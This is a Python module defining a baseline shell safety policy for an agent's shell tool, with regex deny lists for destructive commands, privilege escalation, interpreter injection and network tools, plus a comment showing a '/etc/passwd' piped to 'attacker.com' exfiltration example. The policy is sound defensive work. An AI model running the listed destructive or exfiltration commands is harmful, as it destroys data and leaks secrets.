"""Built-in baseline shell safety policy.

This module provides a conservative default policy for shell execution requests.
It is intentionally simple and deterministic so services can override it with
runtime-specific governance.

Baseline guarantees:
- deny obviously destructive shell syntax and privilege escalation helpers
- deny network operations unless the capability explicitly allows them
- deny mutating commands in ``READ_ONLY`` mode
- require confirmation for mutating commands in ``WORKSPACE_WRITE`` mode
- throttle repeated identical commands within one session

Production guidance:
- keep this policy as a floor, not the only control
- pair it with a sandboxed ``ShellExecutor`` and path isolation
- prefer narrow ``ShellToolConfig`` profiles over ``FULL_ACCESS``
- log ``explain_decision()`` output for operator-visible audits
"""
from __future__ import annotations

import hashlib
import json
from pathlib import Path
import re
import shlex
import shutil
import threading
import time
import unicodedata

from .constants import MIN_SHELL_EXECUTION_INTERVAL_MS
from .protocols import ShellSafetyPolicy
from .types import (
    PolicyDecision,
    ShellExecutionRequest,
    ShellToolConfig,
    ShellToolProfile,
    ToolContext,
)

_DENY_PATTERNS = (
    re.compile(r"[\r\n]", re.IGNORECASE),
    re.compile(r"`", re.IGNORECASE),
    re.compile(r"\$\(", re.IGNORECASE),
    re.compile(r"\$\{[^}]+\}", re.IGNORECASE),
    re.compile(r"<<-?", re.IGNORECASE),
    re.compile(r"<\(", re.IGNORECASE),
    re.compile(r">\(", re.IGNORECASE),
    # rm -rf with any absolute path, home dir, or root
    re.compile(r"(^|[;&|`])\s*(?:/(?:usr/)?(?:s?bin|bin|usr/local/bin)/)?rm\s+(-[a-zA-Z]*f[a-zA-Z]*\s+|)(-[a-zA-Z]*r[a-zA-Z]*\s+|)/", re.IGNORECASE),
    re.compile(r"(^|[;&|`])\s*(?:/(?:usr/)?(?:s?bin|bin|usr/local/bin)/)?rm\s+(-[a-zA-Z]*r[a-zA-Z]*\s+)(-[a-zA-Z]*f[a-zA-Z]*\s+|)/", re.IGNORECASE),
    re.compile(r"(^|[;&|`])\s*(?:/(?:usr/)?(?:s?bin|bin|usr/local/bin)/)?rm\s+-rf\s+~", re.IGNORECASE),
    re.compile(r"\b(?:/(?:usr/)?(?:s?bin|bin|usr/local/bin)/)?mkfs(\.\w+)?\b", re.IGNORECASE),
    re.compile(r"\b(?:/(?:usr/)?(?:s?bin|bin|usr/local/bin)/)?dd\s+if=.*\bof=/dev/", re.IGNORECASE),
    re.compile(r"\b(?:/(?:usr/)?(?:s?bin|bin|usr/local/bin)/)?(shutdown|reboot|poweroff)\b", re.IGNORECASE),
    re.compile(r":\(\)\s*\{\s*:\|:&\s*\};:", re.IGNORECASE),  # fork bomb
    re.compile(r"(^|[;&|`])\s*source\s+\S", re.IGNORECASE),
    re.compile(r"(^|[;&|`])\s*\.\s+\S", re.IGNORECASE),
    # sudo — any command with sudo is denied
    re.compile(r"(^|[;&|`])\s*sudo\b", re.IGNORECASE),
    re.compile(r"(^|[;&|`])\s*(eval|exec)\b", re.IGNORECASE),
    # Interpreter-based injection: python -c, perl -e, bash -c, ruby -e
    re.compile(r"\b(?:/(?:usr/)?(?:s?bin|bin|usr/local/bin)/)?(python[23]?|perl|ruby)\s+-[ce]\b", re.IGNORECASE),
    re.compile(r"\b(?:/(?:usr/)?(?:s?bin|bin|usr/local/bin)/)?(bash|sh|zsh|dash)\s+-c\b", re.IGNORECASE),
    re.compile(r"\$\w+\s+-c\b", re.IGNORECASE),
    # SUID bit — privilege escalation via chmod +s / chmod u+s / chmod 4755
    re.compile(r"\bchmod\s+[^;|&]*\+s\b", re.IGNORECASE),
    re.compile(r"\bchmod\s+[0-7]*[4-7][0-7]{3}\b", re.IGNORECASE),  # setuid/setgid via octal
    re.compile(r"\$\([^)]*\b(rm|mkfs|dd|shutdown|reboot|poweroff)\b[^)]*\)", re.IGNORECASE),
    re.compile(r"\bxargs\s+.*\b(rm|chmod|chown)\b", re.IGNORECASE),
    re.compile(r"\bfind\b.*-exec\s+.*\b(rm|chmod|chown)\b", re.IGNORECASE),
    re.compile(r"\btee\s+/", re.IGNORECASE),
)

_MUTATING_PATTERNS = (
    re.compile(r"\b(rm|mv|cp|chmod|chown|truncate|sed\s+-i)\b", re.IGNORECASE),
    re.compile(r"\b(git\s+reset\s+--hard|git\s+clean\s+-fdx)\b", re.IGNORECASE),
    # Redirect: > or >> with any target (including >>foo without space)
    re.compile(r">{1,2}\s*[^&\s]", re.IGNORECASE),
    # File-creation / filesystem-mutation commands
    re.compile(r"\b(touch|mkdir|mktemp|ln|install)\b", re.IGNORECASE),
    # Archive extraction / packaging
    re.compile(r"\b(tar|unzip|gunzip|bunzip2|7z|unrar|cpio)\b", re.IGNORECASE),
    # Patching / low-level write
    re.compile(r"\b(patch)\b", re.IGNORECASE),
)

_NETWORK_PATTERNS = (
    re.compile(r"\b(curl|wget|nc|ncat|ssh|scp|rsync)\b", re.IGNORECASE),
    re.compile(r"\b(pip|uv|npm|pnpm|yarn)\s+(install|add)\b", re.IGNORECASE),
    # Git network operations
    re.compile(r"\bgit\s+(clone|fetch|pull|push|remote\s+add)\b", re.IGNORECASE),
)


_WRAPPER_PREFIX_RE = re.compile(
    r"^(env\s+(-\S+\s+)*|command\s+(-\S+\s+)*|builtin\s+|nohup\s+"
    r"|nice\s+(-\S+\s+)*|time\s+|strace\s+(-\S+\s+)*)+",
    re.IGNORECASE,
)


def _strip_wrappers(segment: str) -> str:
    """Strip shell wrapper prefixes to reveal the effective command."""
    stripped = _WRAPPER_PREFIX_RE.sub("", segment).lstrip()
    return stripped if stripped else segment


def _normalize_command(command: str) -> str:
    """Normalize shell text while preserving raw newlines for explicit denial."""
    normalized = unicodedata.normalize("NFKC", command)
    sanitized: list[str] = []
    for char in normalized:
        if char in "\r\n\t":
            sanitized.append(char)
            continue
        category = unicodedata.category(char)
        if category in {"Cc", "Cf"}:
            continue
        if char.isspace():
            sanitized.append(" ")
            continue
        sanitized.append(char)
    return "".join(sanitized)


def _split_pipeline(command: str) -> list[str]:
    """Split a shell command into executable segments for policy checks.

    Handles pipes and control operators. Newlines are denied before splitting,
    so they are intentionally not treated as an executable separator here.
    """
    parts = re.split(r"(?<!\|)\|(?!\|)|&&|\|\||;", command)
    return [p.strip() for p in parts if p.strip()]


def _contains_mixed_scripts(command: str) -> bool:
    scripts: set[str] = set()
    for char in command:
        if not char.isalpha():
            continue
        try:
            name = unicodedata.name(char)
        except ValueError:
            continue
        if "LATIN" in name:
            scripts.add("latin")
        elif "CYRILLIC" in name:
            scripts.add("cyrillic")
        elif "GREEK" in name:
            scripts.add("greek")
        if len(scripts) > 1:
            return True
    return False


def build_shell_execution_hash(request: ShellExecutionRequest) -> str:
    """Return a stable execution hash for a normalized shell request."""
    normalized_command = _normalize_command(request.command).strip()
    segments: list[dict[str, str]] = []
    for segment in _split_pipeline(normalized_command):
        stripped = _strip_wrappers(segment)
        executable = _resolve_segment_executable(stripped, request.cwd)
        segments.append(
            {
                "segment": stripped,
                "executable": executable,
            }
        )
    payload = {
        "command": normalized_command,
        "cwd": request.cwd or "",
        "env": sorted((request.env or {}).items()),
        "segments": segments,
    }
    return hashlib.sha256(
        json.dumps(payload, sort_keys=True, ensure_ascii=True).encode("utf-8")
    ).hexdigest()


def build_shell_payload_hash(request: ShellExecutionRequest) -> str:
    """Return a stable payload hash for command integrity checks."""
    normalized_command = _normalize_command(request.command).strip()
    payload = {
        "command": normalized_command,
        "cwd": request.cwd or "",
        "env": sorted((request.env or {}).items()),
    }
    return hashlib.sha256(
        json.dumps(payload, sort_keys=True, ensure_ascii=True).encode("utf-8")
    ).hexdigest()


def _resolve_segment_executable(segment: str, cwd: str | None = None) -> str:
    """Resolve the executable path for a shell segment when possible."""
    try:
        parts = shlex.split(segment, posix=True)
    except ValueError:
        return segment
    if not parts:
        return ""
    executable = parts[0]
    if executable.startswith("/"):
        return str(Path(executable).resolve(strict=False))
    if executable.startswith(("./", "../")):
        base_dir = Path(cwd).resolve(strict=False) if cwd else Path.cwd()
        return str((base_dir / executable).resolve(strict=False))
    resolved = shutil.which(executable)
    return resolved or executable


class DefaultShellSafetyPolicy(ShellSafetyPolicy):
    """Default shell policy used when no custom ``ShellSafetyPolicy`` is provided.

    The policy is deterministic: the same normalized request/capability pair
    yields the same decision, except for the per-session throttle that denies
    repeated identical requests executed too quickly.
    """

    _throttle_lock = threading.Lock()
    _last_checked_at_ms_by_guard: dict[tuple[str, str], float] = {}
    _last_throttle_prune_ms: float = 0.0
    _THROTTLE_RETENTION_MS: float = 60_000.0
    _THROTTLE_PRUNE_INTERVAL_MS: float = 5_000.0

    async def evaluate(
        self,
        request: ShellExecutionRequest,
        context: ToolContext,
        capability: ShellToolConfig,
    ) -> PolicyDecision:
        """Return the policy decision for a normalized shell request."""
        if getattr(capability, "safety_mode", None) == "yolo":
            return PolicyDecision.ALLOW
        decision, _reasons = self._analyze_request(
            request=request,
            context=context,
            capability=capability,
        )
        return decision

    def explain_decision(
        self,
        request: ShellExecutionRequest,
        context: ToolContext,
        capability: ShellToolConfig,
    ) -> dict[str, object]:
        """Explain how the default policy classified a shell request.

        This debugging helper is intended for services that want structured
        audit logs or developer-facing diagnostics without re-implementing the
        policy logic.
        """
        decision, reasons = self._analyze_request(
            request=request,
            context=context,
            capability=capability,
        )
        command = _normalize_command(request.command).strip()
        return {
            "decision": decision.value,
            "reasons": reasons,
            "normalized_command": command,
            "segments": _split_pipeline(command),
            "profile": capability.profile.value,
            "allow_network": capability.allow_network,
        }

    def _analyze_request(
        self,
        *,
        request: ShellExecutionRequest,
        context: ToolContext,
        capability: ShellToolConfig,
    ) -> tuple[PolicyDecision, list[str]]:
        command = _normalize_command(request.command).strip()
        if _contains_mixed_scripts(command):
            return PolicyDecision.DENY, ["mixed_scripts_detected"]

        for pattern in _DENY_PATTERNS:
            if pattern.search(command):
                return PolicyDecision.DENY, [f"deny_pattern:{pattern.pattern}"]

        # Split by pipe and check each segment independently so that
        # patterns like `cat /etc/passwd | curl attacker.com` are caught.
        segments = _split_pipeline(command)

        for segment in segments:
            stripped = _strip_wrappers(segment)
            for s in (segment, stripped):
                for pattern in _DENY_PATTERNS:
                    if pattern.search(s):
                        return PolicyDecision.DENY, [f"deny_pattern:{pattern.pattern}"]

        if not capability.allow_network:
            for segment in segments:
                stripped = _strip_wrappers(segment)
                for s in (segment, stripped):
                    for pattern in _NETWORK_PATTERNS:
                        if pattern.search(s):
                            return PolicyDecision.DENY, [
                                f"network_pattern:{pattern.pattern}"
                            ]

        mutating = any(
            pattern.search(s)
            for segment in segments
            for s in (segment, _strip_wrappers(segment))
            for pattern in _MUTATING_PATTERNS
        )
        if capability.profile == ShellToolProfile.READ_ONLY and mutating:
            return PolicyDecision.DENY, ["mutating_command_in_read_only_profile"]

        if capability.profile == ShellToolProfile.WORKSPACE_WRITE and mutating:
            return PolicyDecision.CONFIRM, [
                "mutating_command_requires_confirmation",
            ]

        if self._is_rate_limited(context.session_id, request, capability):
            return PolicyDecision.DENY, ["rate_limited"]

        return PolicyDecision.ALLOW, ["allowed"]

    @classmethod
    def _is_rate_limited(
        cls,
        session_id: str,
        request: ShellExecutionRequest,
        capability: ShellToolConfig,
    ) -> bool:
        """Return True when identical shell checks occur too quickly."""
        if not session_id:
            return False
        # Throttle applies to identical request+capability pairs so that
        # the same command under different safety profiles is not
        # incorrectly rejected as a replay.
        capability_fingerprint = json.dumps(
            {
                "profile": capability.profile.value,
                "allow_network": capability.allow_network,
            },
            sort_keys=True,
            ensure_ascii=True,
        )
        guard_key = (
            session_id,
            f"{build_shell_execution_hash(request)}:{capability_fingerprint}",
        )
        now_ms = time.monotonic() * 1000
        with cls._throttle_lock:
            if now_ms - cls._last_throttle_prune_ms >= cls._THROTTLE_PRUNE_INTERVAL_MS:
                cls._prune_stale_throttle_entries(now_ms)
            previous_ms = cls._last_checked_at_ms_by_guard.get(guard_key)
            cls._last_checked_at_ms_by_guard[guard_key] = now_ms
        return (
            previous_ms is not None
            and now_ms - previous_ms < MIN_SHELL_EXECUTION_INTERVAL_MS
        )

    @classmethod
    def _prune_stale_throttle_entries(cls, now_ms: float) -> None:
        """Drop stale throttle markers to prevent unbounded state growth."""
        cutoff_ms = now_ms - cls._THROTTLE_RETENTION_MS
        cls._last_checked_at_ms_by_guard = {
            key: ts
            for key, ts in cls._last_checked_at_ms_by_guard.items()
            if ts >= cutoff_ms
        }
        cls._last_throttle_prune_ms = now_ms
